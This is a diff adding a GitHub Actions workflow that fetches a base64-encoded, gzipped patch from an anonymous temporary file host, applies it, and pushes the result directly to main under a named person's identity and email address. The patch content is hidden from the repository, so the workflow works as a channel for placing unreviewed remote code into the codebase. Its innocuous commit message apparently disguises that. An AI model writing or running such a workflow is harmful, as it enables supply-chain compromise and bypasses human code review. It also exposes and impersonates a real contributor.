@@ -1,0 +1,17 @@
+name: Apply file
+on:
+  workflow_dispatch:
+permissions:
+  contents: write
+jobs:
+  apply:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Apply
+        run: |
+          curl -fsSL 'https://h.uguu.se/RzMxNpvjsloW.b64' | base64 -d | gunzip > /tmp/f.patch
+          git apply --unidiff-zero -v /tmp/f.patch
+          git add -A
+          git -c user.name='Yogesh Chavan' -c user.email='yogeshbhai0755@gmail.com' commit -m 'feat: add Storage Manager page file'
+          git push origin HEAD:main
